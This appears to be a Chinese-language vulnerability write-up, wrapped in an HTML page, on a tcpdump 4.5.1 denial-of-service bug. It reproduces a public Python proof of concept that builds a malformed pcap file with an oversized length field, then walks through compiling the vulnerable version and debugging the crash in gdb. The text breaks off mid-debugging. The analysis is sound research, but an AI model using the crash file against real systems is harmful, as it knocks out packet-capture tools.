<!DOCTYPE html>
<html>
<head>
<title>Tcpdump 4.5.1 Denial Of Service Vulnerability</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<style type="text/css">
/* GitHub stylesheet for MarkdownPad (http://markdownpad.com) */
/* Author: Nicolas Hery - http://nicolashery.com */
/* Version: b13fe65ca28d2e568c6ed5d7f06581183df8f2ff */
/* Source: https://github.com/nicolahery/markdownpad-github */

/* RESET
=============================================================================*/

html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video {
  margin: 0;
  padding: 0;
  border: 0;
}

/* BODY
=============================================================================*/

body {
  font-family: Helvetica, arial, freesans, clean, sans-serif;
  font-size: 14px;
  line-height: 1.6;
  color: #333;
  background-color: #fff;
  padding: 20px;
  max-width: 960px;
  margin: 0 auto;
}

body>*:first-child {
  margin-top: 0 !important;
}

body>*:last-child {
  margin-bottom: 0 !important;
}

/* BLOCKS
=============================================================================*/

p, blockquote, ul, ol, dl, table, pre {
  margin: 15px 0;
}

/* HEADERS
=============================================================================*/

h1, h2, h3, h4, h5, h6 {
  margin: 20px 0 10px;
  padding: 0;
  font-weight: bold;
  -webkit-font-smoothing: antialiased;
}

h1 tt, h1 code, h2 tt, h2 code, h3 tt, h3 code, h4 tt, h4 code, h5 tt, h5 code, h6 tt, h6 code {
  font-size: inherit;
}

h1 {
  font-size: 28px;
  color: #000;
}

h2 {
  font-size: 24px;
  border-bottom: 1px solid #ccc;
  color: #000;
}

h3 {
  font-size: 18px;
}

h4 {
  font-size: 16px;
}

h5 {
  font-size: 14px;
}

h6 {
  color: #777;
  font-size: 14px;
}

body>h2:first-child, body>h1:first-child, body>h1:first-child+h2, body>h3:first-child, body>h4:first-child, body>h5:first-child, body>h6:first-child {
  margin-top: 0;
  padding-top: 0;
}

a:first-child h1, a:first-child h2, a:first-child h3, a:first-child h4, a:first-child h5, a:first-child h6 {
  margin-top: 0;
  padding-top: 0;
}

h1+p, h2+p, h3+p, h4+p, h5+p, h6+p {
  margin-top: 10px;
}

/* LINKS
=============================================================================*/

a {
  color: #4183C4;
  text-decoration: none;
}

a:hover {
  text-decoration: underline;
}

/* LISTS
=============================================================================*/

ul, ol {
  padding-left: 30px;
}

ul li > :first-child, 
ol li > :first-child, 
ul li ul:first-of-type, 
ol li ol:first-of-type, 
ul li ol:first-of-type, 
ol li ul:first-of-type {
  margin-top: 0px;
}

ul ul, ul ol, ol ol, ol ul {
  margin-bottom: 0;
}

dl {
  padding: 0;
}

dl dt {
  font-size: 14px;
  font-weight: bold;
  font-style: italic;
  padding: 0;
  margin: 15px 0 5px;
}

dl dt:first-child {
  padding: 0;
}

dl dt>:first-child {
  margin-top: 0px;
}

dl dt>:last-child {
  margin-bottom: 0px;
}

dl dd {
  margin: 0 0 15px;
  padding: 0 15px;
}

dl dd>:first-child {
  margin-top: 0px;
}

dl dd>:last-child {
  margin-bottom: 0px;
}

/* CODE
=============================================================================*/

pre, code, tt {
  font-size: 12px;
  font-family: Consolas, "Liberation Mono", Courier, monospace;
}

code, tt {
  margin: 0 0px;
  padding: 0px 0px;
  white-space: nowrap;
  border: 1px solid #eaeaea;
  background-color: #f8f8f8;
  border-radius: 3px;
}

pre>code {
  margin: 0;
  padding: 0;
  white-space: pre;
  border: none;
  background: transparent;
}

pre {
  background-color: #f8f8f8;
  border: 1px solid #ccc;
  font-size: 13px;
  line-height: 19px;
  overflow: auto;
  padding: 6px 10px;
  border-radius: 3px;
}

pre code, pre tt {
  background-color: transparent;
  border: none;
}

kbd {
    -moz-border-bottom-colors: none;
    -moz-border-left-colors: none;
    -moz-border-right-colors: none;
    -moz-border-top-colors: none;
    background-color: #DDDDDD;
    background-image: linear-gradient(#F1F1F1, #DDDDDD);
    background-repeat: repeat-x;
    border-color: #DDDDDD #CCCCCC #CCCCCC #DDDDDD;
    border-image: none;
    border-radius: 2px 2px 2px 2px;
    border-style: solid;
    border-width: 1px;
    font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
    line-height: 10px;
    padding: 1px 4px;
}

/* QUOTES
=============================================================================*/

blockquote {
  border-left: 4px solid #DDD;
  padding: 0 15px;
  color: #777;
}

blockquote>:first-child {
  margin-top: 0px;
}

blockquote>:last-child {
  margin-bottom: 0px;
}

/* HORIZONTAL RULES
=============================================================================*/

hr {
  clear: both;
  margin: 15px 0;
  height: 0px;
  overflow: hidden;
  border: none;
  background: transparent;
  border-bottom: 4px solid #ddd;
  padding: 0;
}

/* TABLES
=============================================================================*/

table th {
  font-weight: bold;
}

table th, table td {
  border: 1px solid #ccc;
  padding: 6px 13px;
}

table tr {
  border-top: 1px solid #ccc;
  background-color: #fff;
}

table tr:nth-child(2n) {
  background-color: #f8f8f8;
}

/* IMAGES
=============================================================================*/

img {
  max-width: 100%
}
</style>
<style type="text/css">
.highlight  { background: #ffffff; }
.highlight .c { color: #999988; font-style: italic } /* Comment */
.highlight .err { color: #a61717; background-color: #e3d2d2 } /* Error */
.highlight .k { font-weight: bold } /* Keyword */
.highlight .o { font-weight: bold } /* Operator */
.highlight .cm { color: #999988; font-style: italic } /* Comment.Multiline */
.highlight .cp { color: #999999; font-weight: bold } /* Comment.Preproc */
.highlight .c1 { color: #999988; font-style: italic } /* Comment.Single */
.highlight .cs { color: #999999; font-weight: bold; font-style: italic } /* Comment.Special */
.highlight .gd { color: #000000; background-color: #ffdddd } /* Generic.Deleted */
.highlight .gd .x { color: #000000; background-color: #ffaaaa } /* Generic.Deleted.Specific */
.highlight .ge { font-style: italic } /* Generic.Emph */
.highlight .gr { color: #aa0000 } /* Generic.Error */
.highlight .gh { color: #999999 } /* Generic.Heading */
.highlight .gi { color: #000000; background-color: #ddffdd } /* Generic.Inserted */
.highlight .gi .x { color: #000000; background-color: #aaffaa } /* Generic.Inserted.Specific */
.highlight .go { color: #888888 } /* Generic.Output */
.highlight .gp { color: #555555 } /* Generic.Prompt */
.highlight .gs { font-weight: bold } /* Generic.Strong */
.highlight .gu { color: #aaaaaa } /* Generic.Subheading */
.highlight .gt { color: #aa0000 } /* Generic.Traceback */
.highlight .kc { font-weight: bold } /* Keyword.Constant */
.highlight .kd { font-weight: bold } /* Keyword.Declaration */
.highlight .kp { font-weight: bold } /* Keyword.Pseudo */
.highlight .kr { font-weight: bold } /* Keyword.Reserved */
.highlight .kt { color: #445588; font-weight: bold } /* Keyword.Type */
.highlight .m { color: #009999 } /* Literal.Number */
.highlight .s { color: #d14 } /* Literal.String */
.highlight .na { color: #008080 } /* Name.Attribute */
.highlight .nb { color: #0086B3 } /* Name.Builtin */
.highlight .nc { color: #445588; font-weight: bold } /* Name.Class */
.highlight .no { color: #008080 } /* Name.Constant */
.highlight .ni { color: #800080 } /* Name.Entity */
.highlight .ne { color: #990000; font-weight: bold } /* Name.Exception */
.highlight .nf { color: #990000; font-weight: bold } /* Name.Function */
.highlight .nn { color: #555555 } /* Name.Namespace */
.highlight .nt { color: #000080 } /* Name.Tag */
.highlight .nv { color: #008080 } /* Name.Variable */
.highlight .ow { font-weight: bold } /* Operator.Word */
.highlight .w { color: #bbbbbb } /* Text.Whitespace */
.highlight .mf { color: #009999 } /* Literal.Number.Float */
.highlight .mh { color: #009999 } /* Literal.Number.Hex */
.highlight .mi { color: #009999 } /* Literal.Number.Integer */
.highlight .mo { color: #009999 } /* Literal.Number.Oct */
.highlight .sb { color: #d14 } /* Literal.String.Backtick */
.highlight .sc { color: #d14 } /* Literal.String.Char */
.highlight .sd { color: #d14 } /* Literal.String.Doc */
.highlight .s2 { color: #d14 } /* Literal.String.Double */
.highlight .se { color: #d14 } /* Literal.String.Escape */
.highlight .sh { color: #d14 } /* Literal.String.Heredoc */
.highlight .si { color: #d14 } /* Literal.String.Interpol */
.highlight .sx { color: #d14 } /* Literal.String.Other */
.highlight .sr { color: #009926 } /* Literal.String.Regex */
.highlight .s1 { color: #d14 } /* Literal.String.Single */
.highlight .ss { color: #990073 } /* Literal.String.Symbol */
.highlight .bp { color: #999999 } /* Name.Builtin.Pseudo */
.highlight .vc { color: #008080 } /* Name.Variable.Class */
.highlight .vg { color: #008080 } /* Name.Variable.Global */
.highlight .vi { color: #008080 } /* Name.Variable.Instance */
.highlight .il { color: #009999 } /* Literal.Number.Integer.Long */
.pl-c {
    color: #969896;
}

.pl-c1,.pl-mdh,.pl-mm,.pl-mp,.pl-mr,.pl-s1 .pl-v,.pl-s3,.pl-sc,.pl-sv {
    color: #0086b3;
}

.pl-e,.pl-en {
    color: #795da3;
}

.pl-s1 .pl-s2,.pl-smi,.pl-smp,.pl-stj,.pl-vo,.pl-vpf {
    color: #333;
}

.pl-ent {
    color: #63a35c;
}

.pl-k,.pl-s,.pl-st {
    color: #a71d5d;
}

.pl-pds,.pl-s1,.pl-s1 .pl-pse .pl-s2,.pl-sr,.pl-sr .pl-cce,.pl-sr .pl-sra,.pl-sr .pl-sre,.pl-src,.pl-v {
    color: #df5000;
}

.pl-id {
    color: #b52a1d;
}

.pl-ii {
    background-color: #b52a1d;
    color: #f8f8f8;
}

.pl-sr .pl-cce {
    color: #63a35c;
    font-weight: bold;
}

.pl-ml {
    color: #693a17;
}

.pl-mh,.pl-mh .pl-en,.pl-ms {
    color: #1d3e81;
    font-weight: bold;
}

.pl-mq {
    color: #008080;
}

.pl-mi {
    color: #333;
    font-style: italic;
}

.pl-mb {
    color: #333;
    font-weight: bold;
}

.pl-md,.pl-mdhf {
    background-color: #ffecec;
    color: #bd2c00;
}

.pl-mdht,.pl-mi1 {
    background-color: #eaffea;
    color: #55a532;
}

.pl-mdr {
    color: #795da3;
    font-weight: bold;
}

.pl-mo {
    color: #1d3e81;
}
.task-list {
padding-left:10px;
margin-bottom:0;
}

.task-list li {
    margin-left: 20px;
}

.task-list-item {
list-style-type:none;
padding-left:10px;
}

.task-list-item label {
font-weight:400;
}

.task-list-item.enabled label {
cursor:pointer;
}

.task-list-item+.task-list-item {
margin-top:3px;
}

.task-list-item-checkbox {
display:inline-block;
margin-left:-20px;
margin-right:3px;
vertical-align:1px;
}
</style>
</head>
<body>
<h1 id="tcpdump-4-5-1-denial-of-service-vulnerability">Tcpdump 4.5.1 Denial Of Service Vulnerability</h1>
<p><strong>Author：wnagzihxa1n<br>Mail：tudouboom@163.com</strong></p>
<p>Tcpdump在处理畸形pcap数据包时，未判断数据包中长度字段的合法性，导致的一个拒绝服务</p>
<p>在EXPKU上有Poc</p>
<ul>
<li><a href="http://www.expku.com/dos/5573.html">http://www.expku.com/dos/5573.html</a></li></ul>
<p>EXP-DB上也有</p>
<ul>
<li><a href="https://www.exploit-db.com/exploits/39875/">https://www.exploit-db.com/exploits/39875/</a></li></ul>
<p>不过Poc都是同一个</p>
<pre><code>from subprocess import call
from shlex import split
from time import sleep

def crash():
    command = &#39;tcpdump -r crash&#39;
    buffer     =   &#39;\xd4\xc3\xb2\xa1\x02\x00\x04\x00\x00\x00\x00\xf5\xff&#39;
    buffer     +=  &#39;\x00\x00\x00I\x00\x00\x00\xe6\x00\x00\x00\x00\x80\x00&#39;
    buffer     +=  &#39;\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00&lt;\x9c7@\xff\x00&#39;
    buffer     +=  &#39;\x06\xa0r\x7f\x00\x00\x01\x7f\x00\x00\xec\x00\x01\xe0\x1a&#39;
    buffer     +=  &quot;\x00\x17g+++++++\x85\xc9\x03\x00\x00\x00\x10\xa0&amp;\x80\x18\&#39;&quot;
    buffer     +=  &quot;xfe$\x00\x01\x00\x00@\x0c\x04\x02\x08\n&#39;, &#39;\x00\x00\x00\x00&quot;
    buffer     +=  &#39;\x00\x00\x00\x00\x01\x03\x03\x04&#39;

    with open(&#39;crash&#39;, &#39;w+b&#39;) as file:
        file.write(buffer)
    try:
        call(split(command))
        print(&quot;Exploit successful!             &quot;)
    except:
        print(&quot;Error: Something has gone wrong!&quot;)

def main():
    print(&quot;Author:   David Silveiro                           &quot;)
    print(&quot;   tcpdump version 4.5.1 Access Violation Crash    &quot;)
    sleep(2)
    crash()

if __name__ == &quot;__main__&quot;:
    main()
</code></pre><p>开始切到Linux下，环境是Ubuntu 32位</p>
<p>先查看版本</p>
<pre><code>wnagzihxain@toT0C:~$ tcpdump --version
tcpdump version 4.9.2
libpcap version 1.7.4
OpenSSL 1.0.2g  1 Mar 2016
</code></pre><p>这个版本太高，漏洞已经修复了</p>
<pre><code>wnagzihxain@toT0C:~$ python Poc.py 
Author:   David Silveiro                           
   tcpdump version 4.5.1 Access Violation Crash    
reading from file crash, link-type IEEE802_15_4_NOFCS (IEEE 802.15.4 without FCS)
17:06:08.000000 IEEE 802.15.4 Beacon packet [|802.15.4]
tcpdump: pcap_loop: bogus savefile header
Exploit successful!
</code></pre><p>下载存在漏洞的版本源码，然后编译出来</p>
<p>要下载两个源码包</p>
<ul>
<li>tcpdump-4.5.1.tar.gz：<a href="http://www.tcpdump.org/release/tcpdump-4.5.1.tar.gz">http://www.tcpdump.org/release/tcpdump-4.5.1.tar.gz</a></li><li>libpcap-1.5.1.tar.gz：<a href="http://www.tcpdump.org/release/libpcap-1.5.1.tar.gz">http://www.tcpdump.org/release/libpcap-1.5.1.tar.gz</a></li></ul>
<p>先编译<code>libpcap-1.5.1</code>，进入该源码目录</p>
<pre><code>wnagzihxain@toT0C:~/tcpdump/source/libpcap-1.5.1$ ./configure
......
checking for flex... no
checking for bison... no
checking for capable lex... insufficient
configure: error: Your operating system&#39;s lex is insufficient to compile
 libpcap.  flex is a lex replacement that has many advantages, including
 being able to compile libpcap.  For more information, see
 http://www.gnu.org/software/flex/flex.html .
</code></pre><p>报错，需要安装<code>flex</code></p>
<pre><code>wnagzihxain@toT0C:~/tcpdump/source/libpcap-1.5.1$ sudo apt install flex
</code></pre><p>执行<code>make</code></p>
<pre><code>wnagzihxain@toT0C:~/tcpdump/source/libpcap-1.5.1$ make
gcc -fpic -I.  -DHAVE_CONFIG_H  -D_U_=&quot;__attribute__((unused))&quot; -g -O2 -c ./pcap-linux.c
......
./runlex.sh lex -oscanner.c scanner.l
yacc -d grammar.y
make: yacc：命令未找到
Makefile:455: recipe for target &#39;grammar.c&#39; failed
make: *** [grammar.c] Error 127
</code></pre><p>报错，需要安装<code>bison</code></p>
<pre><code>wnagzihxain@toT0C:~/tcpdump/source/libpcap-1.5.1$ sudo apt install bison
</code></pre><p>继续<code>make</code>，通过</p>
<p>开始安装，这一步没有报错</p>
<pre><code>wnagzihxain@toT0C:~/tcpdump/source/libpcap-1.5.1$ sudo make install
</code></pre><p>进入Tcpdump源码目录，执行</p>
<pre><code>wnagzihxain@toT0C:~/tcpdump/source/tcpdump-4.5.1$ ./configure
wnagzihxain@toT0C:~/tcpdump/source/tcpdump-4.5.1$ make
wnagzihxain@toT0C:~/tcpdump/source/tcpdump-4.5.1$ sudo make install
</code></pre><p>很顺利的安装完成</p>
<p>查看版本，这里不导出环境变量，直接指定执行</p>
<pre><code>wnagzihxain@toT0C:~/tcpdump/source/tcpdump-4.5.1$ ./tcpdump --version
./tcpdump: invalid option -- &#39;-&#39;
tcpdump version 4.5.1
libpcap version 1.5.1
Usage: tcpdump [-aAbdDefhHIJKlLnNOpqRStuUvxX] [ -B size ] [ -c count ]
        [ -C file_size ] [ -E algo:secret ] [ -F file ] [ -G seconds ]
        [ -i interface ] [ -j tstamptype ] [ -M secret ]
        [ -P in|out|inout ]
        [ -r file ] [ -s snaplen ] [ -T type ] [ -V file ] [ -w file ]
        [ -W filecount ] [ -y datalinktype ] [ -z command ]
        [ -Z user ] [ expression ]
</code></pre><p>然后我们将可执行文件拷贝出来，捕获一下数据看看</p>
<pre><code>wnagzihxain@toT0C:~/Tcpdump 4.5.1 Denial Of Service Vulnerability$ sudo ./tcpdump -i ens33
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on ens33, link-type EN10MB (Ethernet), capture size 65535 bytes
14:45:52.003921 IP bogon.55709 &gt; 239.255.255.250.1900: UDP, length 414
14:45:52.003929 IP bogon.55709 &gt; 239.255.255.250.1900: UDP, length 406
14:45:52.003931 IP bogon.55709 &gt; 239.255.255.250.1900: UDP, length 470
</code></pre><p>如果可以捕获数据说明我们编译这一步已经完成，接下来我们来跑一下Poc，如果是按照我这种方式编译的，需要修改一下Poc，改为本地的build</p>
<pre><code>command = &#39;./tcpdump -r crash&#39;
</code></pre><p>然后跑起来，因为读出来的数据实在太大，所以这里只能看到一部分</p>
<p><img src="Image/1.png" alt=""></p>
<p>拉到最上面发现很多输出被截掉了，所以我们将输出保存到文件里</p>
<pre><code>wnagzihxain@toT0C:~/Tcpdump 4.5.1 Denial Of Service Vulnerability$ python Poc.py &gt; mRecord
</code></pre><p>确实很多很多，有8k行，这里截取部分输出数据</p>
<pre><code>17:06:08.000000 IEEE 802.15.4 Beacon packet 
    0x0000:  39b8 ffff ffff da0e 06a8 ffff ffff dad9  9...............
    0x0010:  1bb8 ffff ffff dbed e8a8 ffff ffff dcb8  ................
    0x0020:  fdb8 ffff ffff ddcd caa8 ffff ffff dea2  ................
    0x0030:  1a38 ffff ffff df11 0000 0080 4c15 0940  .8..........L..@
    0x0040:  4d15 0900 0000 0039 0000 0000 0000 0000  M......9........
    0x0050:  0000 0000 0000 0000 0000 0001 0000 0001  ................
......
    0x20ad0:  0000 0000 0000 0000 0000 0000 0000 0000  ................
    0x20ae0:  0000 0000 0000 0000 0000 0000 0000 0000  ................
    0x20af0:  0000 0000 0000 0000 0000 0000 0000 0000  ................
    0x20b00:  0000 0000 0000 0000 0000 0000 0000 0000  ................
    0x20b10:  0000 0000 0000 0000Author:   David Silveiro                           
   tcpdump version 4.5.1 Access Violation Crash    
Exploit successful!
</code></pre><p>利用成功，我们来使用gdb跟踪下，看看哪里出了问题</p>
<pre><code>wnagzihxain@toT0C:~/Tcpdump 4.5.1 Denial Of Service Vulnerability$ gdb ./tcpdump
</code></pre><p>设置参数，因为我们刚才测试Poc的时候就已经生成了这个crash文件，所以这里可以直接用</p>
<pre><code>gdb-peda$ set args -r crash
</code></pre><p>运行起来</p>
<pre><code>gdb-peda$ r
</code></pre><p>在很多输出闪过之后，断了下来</p>
<pre><code> [----------------------------------registers-----------------------------------]
EAX: 0x5 
EBX: 0x82213d5 --&gt; 0xffffb839 
ECX: 0x2e (&#39;.&#39;)
EDX: 0x0 
ESI: 0xbfffd9f9 (&quot;......&quot;)
EDI: 0xbfffd9df --&gt; 0x30303000 (&#39;&#39;)
EBP: 0x10615 
ESP: 0xbfffd99c --&gt; 0x805416a (&lt;hex_and_ascii_print_with_offset+170&gt;:    mov    ecx,DWORD PTR [esp+0xc])
EIP: 0x805412a (&lt;hex_and_ascii_print_with_offset+106&gt;:    movzx  edx,BYTE PTR [ebx+ebp*2+0x1])
EFLAGS: 0x210296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x805411d &lt;hex_and_ascii_print_with_offset+93&gt;:    je     0x8054200 &lt;hex_and_ascii_print_with_offset+320&gt;
   0x8054123 &lt;hex_and_ascii_print_with_offset+99&gt;:    mov    ebx,DWORD PTR [esp+0x18]
   0x8054127 &lt;hex_and_ascii_print_with_offset+103&gt;:    sub    esp,0x4
=&gt; 0x805412a &lt;hex_and_ascii_print_with_offset+106&gt;:    movzx  edx,BYTE PTR [ebx+ebp*2+0x1]
   0x805412f &lt;hex_and_ascii_print_with_offset+111&gt;:    movzx  ecx,BYTE PTR [ebx+ebp*2]
   0x8054133 &lt;hex_and_ascii_print_with_offset+115&gt;:    push   edx
   0x8054134 &lt;hex_and_ascii_print_with_offset+116&gt;:    mov    ebx,edx
   0x8054136 &lt;hex_and_ascii_print_with_offset+118&gt;:    mov    DWORD PTR [esp+0x18],edx
[------------------------------------stack-------------------------------------]
0000| 0xbfffd99c --&gt; 0x805416a (&lt;hex_and_ascii_print_with_offset+170&gt;:    mov    ecx,DWORD PTR [esp+0xc])
0004| 0xbfffd9a0 --&gt; 0xb7fff000 --&gt; 0x23f3c 
0008| 0xbfffd9a4 --&gt; 0x5 
0012| 0xbfffd9a8 --&gt; 0x2f5967 (&#39;gY/&#39;)
0016| 0xbfffd9ac --&gt; 0x0 
0020| 0xbfffd9b0 --&gt; 0x0 
0024| 0xbfffd9b4 --&gt; 0x7ffffff9 
0028| 0xbfffd9b8 --&gt; 0x82213d5 --&gt; 0xffffb839 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
hex_and_ascii_print_with_offset (ident=0x80dfcef &quot;\n\t&quot;, 
    cp=0x8242000 &lt;error: Cannot access memory at address 0x8242000&gt;, length=0xfffffff3, oset=0x20c20)
    at ./print-ascii.c:91
91            s2 = *cp++;
</code></pre><p>这个位置其实可以看出很多信息，首先断在这个位置，这句指令是在读取某个地址的数据</p>
<pre><code>=&gt; 0x805412a &lt;hex_and_ascii_print_with_offset+106&gt;:    movzx  edx,BYTE PTR [ebx+ebp*2+0x1]
</code></pre><p>下面的输出显示该地址不可读，并且指出出现问题的源码位置（感觉跟开了挂一样）</p>
<pre><code>Stopped reason: SIGSEGV
hex_and_ascii_print_with_offset (ident=0x80dfcef &quot;\n\t&quot;, 
    cp=0x8242000 &lt;error: Cannot access memory at address 0x8242000&gt;, length=0xfffffff3, oset=0x20c20)
    at ./print-ascii.c:91
91            s2 = *cp++;
</code></pre><p>先不去看源码，直接分析汇编</p>
<p>首先查看函数调用栈</p>
<pre><code>gdb-peda$ bt
#0  hex_and_ascii_print_with_offset (ident=0x80dfcef &quot;\n\t&quot;, 
    cp=0x8242000 &lt;error: Cannot access memory at address 0x8242000&gt;, length=0xfffffff3, oset=0x20c20)
    at ./print-ascii.c:91
#1  0x080542e6 in hex_and_ascii_print (ident=0x80dfcef &quot;\n\t&quot;, 
    cp=0x82213d5 &quot;9\270\377\377\377\377\332\016\006\250\377\377\377\377\332\331\033\270\377\377\377\377\333\355\350\250\377\377\377\377ܸ\375\270\377\377\377\377\335\315ʨ\377\377\377\377ޢ\032\070\377\377\377\377\337\021&quot;, 
    length=0xfffffff3) at ./print-ascii.c:127
#2  0x0805233d in ieee802_15_4_if_print (ndo=0x821eb80 &lt;Gndo&gt;, h=0xbfffdbfc, p=&lt;optimized out&gt;)
    at ./print-802_15_4.c:180
#3  0x080a230a in print_packet (user=0xbfffdccc &quot;\200\353!\b\200!\005\b\001&quot;, h=0xbfffdbfc, sp=0x82213c0 &quot;@\377&quot;)
    at ./tcpdump.c:1950
#4  0x080c19f8 in pcap_offline_read (p=0x82211b8, cnt=0xffffffff, callback=0x80a22c0 &lt;print_packet&gt;, 
    user=0xbfffdccc &quot;\200\353!\b\200!\005\b\001&quot;) at ./savefile.c:409
#5  0x080b3313 in pcap_loop (p=0x82211b8, cnt=0xffffffff, callback=0x80a22c0 &lt;print_packet&gt;, 
    user=0xbfffdccc &quot;\200\353!\b\200!\005\b\001&quot;) at ./pcap.c:849
#6  0x0804b89d in main (argc=0x3, argv=0xbfffeeb4) at ./tcpdump.c:1569
#7  0xb7c34637 in __libc_start_main (main=0x804a9a0 &lt;main&gt;, argc=0x3, argv=0xbfffeeb4, 
    init=0x80d0890 &lt;__libc_csu_init&gt;, fini=0x80d08f0 &lt;__libc_csu_fini&gt;, rtld_fini=0xb7fea8a0 &lt;_dl_fini&gt;, 
    stack_end=0xbfffeeac) at ../csu/libc-start.c:291
#8  0x0804c705 in _start ()
</code></pre><p>因为我们知道这个漏洞触发的原因是没有对数据包的长度字段做判断导致的拒绝服务，所以现在来学习下pcap数据包格式</p>
<p>我们正常捕获一个文件进行格式分析，不要捕获太多数据包了，整个文件读出来会很长，捕获一两个比较好</p>
<pre><code>wnagzihxain@toT0C:~/Tcpdump 4.5.1 Denial Of Service Vulnerability$ sudo ./tcpdump -i ens33 -c 2 -w test.pcap
[sudo] wnagzihxain 的密码： 
tcpdump: listening on ens33, link-type EN10MB (Ethernet), capture size 65535 bytes
2 packets captured
2 packets received by filter
0 packets dropped by kernel
wnagzihxain@toT0C:~/Tcpdump 4.5.1 Denial Of Service Vulnerability$ hexdump -C test.pcap 
00000000  d4 c3 b2 a1 02 00 04 00  00 00 00 00 00 00 00 00  |................|
00000010  ff ff 00 00 01 00 00 00  ec a9 44 5a 84 c9 04 00  |..........DZ....|
00000020  ab 00 00 00 ab 00 00 00  01 00 5e 7f ff fa 00 50  |..........^....P|
00000030  56 c0 00 08 08 00 45 00  00 9d 2f a5 00 00 04 11  |V.....E.../.....|
00000040  5d 07 c0 a8 79 01 ef ff  ff fa e9 76 07 6c 00 89  |]...y......v.l..|
00000050  98 86 4d 2d 53 45 41 52  43 48 20 2a 20 48 54 54  |..M-SEARCH * HTT|
00000060  50 2f 31 2e 31 0d 0a 48  4f 53 54 3a 20 32 33 39  |P/1.1..HOST: 239|
00000070  2e 32 35 35 2e 32 35 35  2e 32 35 30 3a 31 39 30  |.255.255.250:190|
00000080  30 0d 0a 4d 41 4e 3a 20  22 73 73 64 70 3a 64 69  |0..MAN: &quot;ssdp:di|
00000090  73 63 6f 76 65 72 22 0d  0a 4d 58 3a 20 35 0d 0a  |scover&quot;..MX: 5..|
000000a0  53 54 3a 20 75 72 6e 3a  73 63 68 65 6d 61 73 2d  |ST: urn:schemas-|
000000b0  75 70 6e 70 2d 6f 72 67  3a 64 65 76 69 63 65 3a  |upnp-org:device:|
000000c0  4d 65 64 69 61 52 65 6e  64 65 72 65 72 3a 31 0d  |MediaRenderer:1.|
000000d0  0a 0d 0a ec a9 44 5a e1  53 06 00 ab 00 00 00 ab  |.....DZ.S.......|
000000e0  00 00 00 01 00 5e 7f ff  fa 00 50 56 c0 00 08 08  |.....^....PV....|
000000f0  00 45 00 00 9d 2f a6 00  00 04 11 5d 06 c0 a8 79  |.E.../.....]...y|
00000100  01 ef ff ff fa e9 76 07  6c 00 89 98 86 4d 2d 53  |......v.l....M-S|
00000110  45 41 52 43 48 20 2a 20  48 54 54 50 2f 31 2e 31  |EARCH * HTTP/1.1|
00000120  0d 0a 48 4f 53 54 3a 20  32 33 39 2e 32 35 35 2e  |..HOST: 239.255.|
00000130  32 35 35 2e 32 35 30 3a  31 39 30 30 0d 0a 4d 41  |255.250:1900..MA|
00000140  4e 3a 20 22 73 73 64 70  3a 64 69 73 63 6f 76 65  |N: &quot;ssdp:discove|
00000150  72 22 0d 0a 4d 58 3a 20  35 0d 0a 53 54 3a 20 75  |r&quot;..MX: 5..ST: u|
00000160  72 6e 3a 73 63 68 65 6d  61 73 2d 75 70 6e 70 2d  |rn:schemas-upnp-|
00000170  6f 72 67 3a 64 65 76 69  63 65 3a 4d 65 64 69 61  |org:device:Media|
00000180  52 65 6e 64 65 72 65 72  3a 31 0d 0a 0d 0a        |Renderer:1....|
0000018e
</code></pre><p>在源码中找到对pcap格式的定义，大概就是一些无关紧要的Magic Number，版本号，时间戳等数据</p>
<pre><code>struct pcap_file_header {
    bpf_u_int32 magic;
    u_short version_major;
    u_short version_minor;
    bpf_int32 thiszone;    /* gmt to local correction */
    bpf_u_int32 sigfigs;    /* accuracy of timestamps */
    bpf_u_int32 snaplen;    /* max length saved portion of each pkt */
    bpf_u_int32 linktype;    /* data link type (LINKTYPE_*) */
};
</code></pre><p>手动对应太麻烦，直接模板</p>
<p><img src="Image/2.png" alt=""></p>
<p>然后是数据帧部分，第一个成员是另一个结构体变量，这里不重要，问题在于数据帧的长度，也就是第三个变量出了问题</p>
<pre><code>struct pcap_pkthdr {
    struct timeval ts;    /* time stamp */
    bpf_u_int32 caplen;    /* length of portion present */
    bpf_u_int32 len;    /* length this packet (off wire) */
};
</code></pre><p>这是我们生成的crash文件</p>
<pre><code>wnagzihxain@toT0C:~/Tcpdump 4.5.1 Denial Of Service Vulnerability$ hexdump -C crash 
00000000  d4 c3 b2 a1 02 00 04 00  00 00 00 f5 ff 00 00 00  |................|
00000010  49 00 00 00 e6 00 00 00  00 80 00 00 00 00 00 00  |I...............|
00000020  08 00 00 00 00 3c 9c 37  40 ff 00 06 a0 72 7f 00  |.....&lt;.7@....r..|
00000030  00 01 7f 00 00 ec 00 01  e0 1a 00 17 67 2b 2b 2b  |............g+++|
00000040  2b 2b 2b 2b 85 c9 03 00  00 00 10 a0 26 80 18 27  |++++........&amp;..&#39;|
00000050  78 66 65 24 00 01 00 00  40 0c 04 02 08 0a 27 2c  |xfe$....@.....&#39;,|
00000060  20 27 00 00 00 00 00 00  00 00 01 03 03 04        | &#39;............|
0000006e
</code></pre><p>我们这里只添加了一个数据帧，长度是<code>0x379c3c00</code>，贼大</p>
<pre><code>00 3c 9c 37
</code></pre><p>到这里，我们继续调试，重新启动程序</p>
<pre><code>gdb-peda$ start
</code></pre><p>这里有个小问题，就是默认开启优化进行编译，调试的时候是不按照指令的顺序执行的，所以如果觉得费劲的同学，可以在<code>makefile</code>里删除<code>-g -O2</code>选项，再次进行编译即可</p>
<p>先<code>./configure</code>，然后修改<code>makefile</code>，关键位置，把<code>-g</code>选项删掉，调试的时候就不会关联源码，也不会进行优化</p>
<pre><code>CFLAGS = -DINET6 -g -O2
</code></pre><p>重新编译完成后，再次调试，可以看到已经不提示源码等信息了</p>
<pre><code> [----------------------------------registers-----------------------------------]
EAX: 0xb7dcfdbc --&gt; 0xbfffeeb4 --&gt; 0xbffff0f4 (&quot;LC_PAPER=zh_HK.UTF-8&quot;)
EBX: 0x0 
